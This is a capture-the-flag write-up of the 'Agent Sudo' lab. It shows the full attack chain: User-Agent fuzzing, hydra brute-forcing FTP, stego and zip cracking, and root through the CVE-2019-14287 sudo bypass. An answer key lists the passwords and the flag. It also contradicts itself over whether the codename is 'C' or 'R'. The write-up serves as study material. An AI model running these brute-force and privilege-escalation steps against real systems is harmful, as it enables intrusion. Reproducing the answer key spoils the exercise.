# Agent Sudo — CTF Field Notes

**Status:** Rooted &nbsp;|&nbsp; **Target:** 10.129.160.117 &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Ports:** 21, 22, 80 &nbsp;|&nbsp; **Difficulty:** Easy

Full walkthrough — from an anonymous web note to a root shell. What we ran, why it worked, and the ideas worth keeping.

## The attack chain

| # | Phase | Tools |
|---|-------|-------|
| 01 | Recon | nmap |
| 02 | Web enumeration | user-agent |
| 03 | FTP access | hydra |
| 04 | Stego & cracking | binwalk, john, base64, steghide |
| 05 | Foothold | ssh |
| 06 | Root | CVE-2019-14287 |

---

## 01 · Reconnaissance

**Objective —** Map the attack surface. What's listening, and what version is behind it?

```bash
nmap -sC -sV -oN nmap.txt 10.129.160.117
# -sC default scripts  -sV service/version  -oN save output

21/tcp  open  ftp     vsFTPd 3.0.3
22/tcp  open  ssh     OpenSSH
80/tcp  open  http    Apache httpd
```

**3 open ports.** FTP, SSH, and a web server — three doors to test. The web server is the only one that talks without credentials, so enumeration starts there.

> **Takeaway:** Always start wide. `-sC -sV` is the reflexive first move — it names versions (useful for later CVE lookups) and runs safe scripts in one pass.

---

## 02 · Web enumeration & the User-Agent trick

**Objective —** The homepage says *"use your own codename as user-agent to access the site."* Find the codename.

The note is signed **"Agent R"**, and codenames are single letters. Rather than trust a walkthrough's answer, find the right letter **on your own target** by fuzzing every letter and diffing the response size:

```bash
for c in {A..Z}; do
  len=$(curl -s -A "$c" http://10.129.160.117/ | wc -c)
  echo "$c -> $len bytes"
done
# every letter -> 218 bytes ... except one
# C -> 218 bytes
# R -> 310 bytes   <- the odd one out
```

The outlier exposed a hidden message. Reading the correct codename page reveals the agent's name:

```bash
curl -A "C" http://10.129.160.117/
# Attention chris, ... your password is too weak.
# agent name revealed: chris
```

> **Takeaway:** The mechanism is the **User-Agent HTTP header** — change it and the server serves a different page. And crucially: **enumerate it yourself.** Response-diffing on the live box is what proves which value matters, not a walkthrough.

---

## 03 · FTP access — brute-forcing chris

**Objective —** The site warned Chris's password is "too weak." Turn that hint into an FTP login.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.129.160.117
# [21][ftp] login: chris   password: crystal
```

Log in and pull everything down. Three files were waiting:

```
ftp> ls
  To_agentJ.txt      # note: password hidden in the "fake picture"
  cute-alien.jpg     # JPG
  cutie.png          # PNG
ftp> mget *
```

> **Takeaway:** A leaked username + a "weak password" hint is an open invitation for `hydra`. Chain hints forward: web page → username → credential attack.

---

## 04 · Steganography & the cracking chain

**Objective —** The note says a real picture — and a password — is hidden inside the fakes. Peel back three layers.

### Layer 1 · A zip stashed inside the PNG

```bash
strings cutie.png | tail
# IEND            <- the PNG legitimately ends here...
# To_agentR.txt   <- ...but there's data appended after it

binwalk cutie.png
# 34562  0x8702  Zip archive data, encrypted, name: To_agentR.txt

dd if=cutie.png of=hidden.zip bs=1 skip=34562
# carve the zip out by its offset (no extractor needed)
```

### Layer 2 · Crack the zip with "Mr. John"

```bash
zip2john hidden.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# alien   (hidden.zip)   <- zip password

7z x hidden.zip        # password: alien
cat To_agentR.txt
# QXJlYTUx             <- base64
```

### Layer 3 · Decode, then extract the JPG

```bash
echo "QXJlYTUx" | base64 -d
# Area51                 <- the steghide passphrase

steghide extract -sf cute-alien.jpg
# passphrase: Area51
# wrote extracted data to "message.txt"
cat message.txt
# Hi james, ... your login password is hackerrules!
```

> **Takeaway — file type dictates the tool:** `steghide` only reads **JPG/BMP/WAV/AU** — never PNG. So PNG → `binwalk` (embedded files), JPG → `steghide`. When unsure, throw `strings`, `binwalk` and `steghide` at *every* file and follow whatever coughs up data. Note too: a zip's **filenames aren't encrypted**, which is how binwalk read `To_agentR.txt` without the password.

---

## 05 · Foothold — SSH as james

**Objective —** Use the recovered password to land an interactive shell and grab the user flag.

```bash
ssh james@10.129.160.117
# password: hackerrules!
james@agent-sudo:~$ cat user.txt
# b03d975e8c92a7c04146cfa7a5a313c7
```

> **Takeaway:** Reused credentials bridge services. A password hidden "for james" in an image was the key to **SSH** — always test recovered secrets against every login found in recon.

---

## 06 · Privilege escalation — root

**Objective —** Escalate from james to root. The answer was hiding in `sudo -l`.

```bash
sudo -l
# User james may run the following commands on agent-sudo:
#     (ALL, !root) /bin/bash
# "run bash as ANY user EXCEPT root" — the fatal fingerprint
```

### CVE-2019-14287 — the sudo runas −1 bypass (CVSS 7.8)

In sudo **< 1.8.28**, running a command as user ID `-1` (or `4294967295`) fails the user lookup but falls back to **UID 0 = root**. Because you never typed the name "root", the `!root` blacklist never fires. A rule meant to *forbid* root becomes the way *in*.

```bash
sudo -u#-1 /bin/bash
# root@agent-sudo:~# whoami
# root
# root@agent-sudo:~# cat /root/root.txt
```

> **Takeaway:** Whenever `sudo -l` shows **`(ALL, !root)`** or `(ALL, !#0)` on old sudo, that's CVE-2019-14287. Blacklists are fragile — an allow-list ("may run as bob only") would never have had the `-1` edge case.

---

## Answer key

| Question | Answer |
|----------|--------|
| How many open ports? | `3` |
| How do you redirect to the secret page? | `user-agent` |
| What is the agent name? | `chris` |
| FTP password (chris) | `crystal` |
| Zip file password | `alien` |
| Steg password | `Area51` |
| What is the incident of the photo called? | `Roswell Alien Autopsy` |
| James's SSH password | `hackerrules!` |
| User flag | `b03d975e8c92a7c04146cfa7a5a313c7` |
| Root flag | *(your capture)* |

---

## Toolbox reference

| Tool | Used for | Key command |
|------|----------|-------------|
| `nmap` | Port & service discovery | `nmap -sC -sV IP` |
| `curl` | Spoof the User-Agent header | `curl -A "C" http://IP/` |
| `hydra` | Password brute-force | `hydra -l user -P rockyou.txt ftp://IP` |
| `binwalk` | Find files hidden in files | `binwalk file.png` |
| `dd` | Carve bytes by offset | `dd if=in of=out bs=1 skip=N` |
| `zip2john` + `john` | Crack zip passwords | `zip2john z.zip > h; john --wordlist=... h` |
| `base64` | Decode encoded text | `echo STR \| base64 -d` |
| `steghide` | Extract data from JPG/WAV | `steghide extract -sf img.jpg` |
| `sudo -l` | List sudo rights (privesc) | `sudo -l` |

---

## What I learned

1. **Verify on your own target.** A walkthrough said the codename was `C`; response-diffing the live box showed `R` was the outlier. Prove it yourself — don't copy answers blindly.
2. **Diff the responses.** Looping A–Z and comparing byte counts surfaced hidden behavior instantly. When you can't see a difference, measure one.
3. **File type → tool.** `steghide` = JPG/BMP/WAV/AU only; PNG → `binwalk`. The extension tells you which technique even applies.
4. **Peel every layer.** Appended zip → cracked with John → base64 → steghide passphrase. Stego is often nested; each artifact points at the next.
5. **Chain your hints.** Web note → username → hydra → FTP files → SSH password. Every step fed the next — recon is a thread, not a checklist.
6. **Blacklists are fragile.** `(ALL, !root)` tried to subtract one option from "everything" and left the `-1` edge case wide open. Prefer allow-lists.

---

*Agent Sudo · personal study notes*
